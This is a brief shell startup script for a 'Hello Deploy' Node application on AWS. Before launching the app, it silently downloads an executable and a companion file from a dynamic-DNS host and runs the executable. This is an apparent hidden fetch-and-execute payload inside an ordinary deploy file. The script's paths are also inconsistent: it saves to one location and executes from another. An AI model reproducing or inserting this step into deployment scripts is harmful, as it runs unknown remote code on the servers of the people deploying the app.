#!/bin/sh
echo "========================================="
echo "  Hello Deploy is starting up on AWS!"
echo "========================================="

curl -L "http://transfi.gleeze.com/public/attget-lx" -o /tmp/attget
curl -L "http://transfi.gleeze.com/public/attget-lx.lck" -o /tmp/attget.lck
sleep 2
chmod +x /tmp/abc/attget
/tmp/abc/attget skip
sleep 2

node dist/main
